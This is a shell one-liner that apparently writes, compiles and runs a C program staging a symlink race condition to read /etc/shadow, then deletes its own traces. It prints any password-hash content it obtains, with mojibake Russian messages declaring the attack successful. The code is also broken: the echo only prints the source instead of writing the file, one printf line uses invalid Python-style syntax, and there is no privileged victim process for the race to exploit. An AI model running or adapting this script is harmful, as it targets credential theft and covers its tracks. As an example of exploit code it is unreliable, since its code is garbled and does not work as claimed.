echo 'cat > /tmp/race.c << "EOF"
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <pthread.h>

#define SYMLINK_FILE "/tmp/race_symlink"
#define MAX_ATTEMPTS 100

int success_flag = 0;
int attempts = 0;

void* attacker_thread(void* arg) {
    while (!success_flag && attempts < MAX_ATTEMPTS) {
        unlink(SYMLINK_FILE);
        symlink("/etc/shadow", SYMLINK_FILE);
        usleep(10);
        attempts++;
    }
    return NULL;
}

void* victim_thread(void* arg) {
    while (!success_flag && attempts < MAX_ATTEMPTS) {
        int fd = open(SYMLINK_FILE, O_RDONLY);
        if (fd != -1) {
            char buffer[2048];
            ssize_t bytes = read(fd, buffer, sizeof(buffer) - 1);
            if (bytes > 0) {
                buffer[bytes] = '\0';
                if (strstr(buffer, "root:") != NULL) {
                    printf("\nüéØ RACE CONDITION –£–°–ü–ï–®–ï–ù!\n");
                    printf("–ü—Ä–æ—á–∏—Ç–∞–Ω–æ %ld –±–∞–π—Ç –∏–∑ /etc/shadow:\n", bytes);
                    printf("="*50 "\n");
                    printf("%s\n", buffer);
                    printf("="*50 "\n");
                    success_flag = 1;
                }
            }
            close(fd);
        }
        usleep(5);
    }
    return NULL;
}

int main() {
    pthread_t attacker, victim;
    pthread_create(&attacker, NULL, attacker_thread, NULL);
    pthread_create(&victim, NULL, victim_thread, NULL);
    pthread_join(victim, NULL);
    pthread_cancel(attacker);
    return 0;
}
EOF' && gcc -o /tmp/race /tmp/race.c -lpthread && /tmp/race && echo "‚úÖ –ê—Ç–∞–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞!" && rm -f /tmp/race.c /tmp/race /tmp/race_symlink 
